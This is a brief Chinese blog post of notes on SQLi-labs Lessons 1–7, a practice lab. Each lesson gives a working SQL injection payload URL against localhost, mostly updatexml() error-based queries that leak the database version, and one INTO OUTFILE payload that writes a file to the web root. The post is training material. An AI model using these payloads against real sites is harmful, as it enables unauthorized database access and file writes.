---
id: 151
title: SQLi-labs笔记
date: 2016-05-31T18:54:39+00:00
author: admin
layout: post
guid: http://www.ikow.cn/?p=151
permalink: /sqli-labs-notes/
categories:
  - WEB
tags:
  - sqli
  - sqli-labs
  - sql注入
---
**less-1**

单引号报错注入，无回显位，利用一些函数，这里附上一个老毛子的链接：http://blackfan.ru/mysql_game/

payload:http://localhost/sqli-labs/Less-1/?id=1&#8217;+union+select+updatexml(0,concat(0x3c,version()),0)%23

**less-2**

整数型报错注入，无回显位，同上

payload:http://localhost/sqli-labs/Less-2/?id=1+union+select+updatexml(0,concat(0x3c,version()),0)%23

**less-3**

有单括号加单引号的报错注入，无回显位，利用同上

payload:http://localhost/sqli-labs/Less-3/?id=1&#8242;)+union+select+updatexml(0,concat(0x3c,version()),0)%23

**less-4**

有单括号加双引号的报错注入，无回显位，利用同上：

payload:http://localhost/sqli-labs/Less-4/?id=1&#8243;)+union+select+updatexml(0,concat(0x3c,version()),0)%23

**less-5**

同less-1一样
  
payload:http://localhost/sqli-labs/Less-5/?id=1&#8217;+union+select+updatexml(0,concat(0x3c,version()),0)%23

**less-6**

同less-2一样**
  
** 

payload:http://localhost/sqli-labs/Less-6/?id=1&#8217;+union+select+updatexml(0,concat(0x3c,version()),0)%23

&nbsp;

**less-7**

无回显，无报错信息，根据题目信息使用loadfile,但是由于本地权限限制，写不了文件，这里给出payload：

payload:http://localhost/sqli-labs/Less-6/?id=1&#8217;+union+select+1,2,3+into+outfile+&#8221;/var/www/html/sqli-labs/test.txt&#8221;&#8211;+

&nbsp;

**less-8**

&nbsp;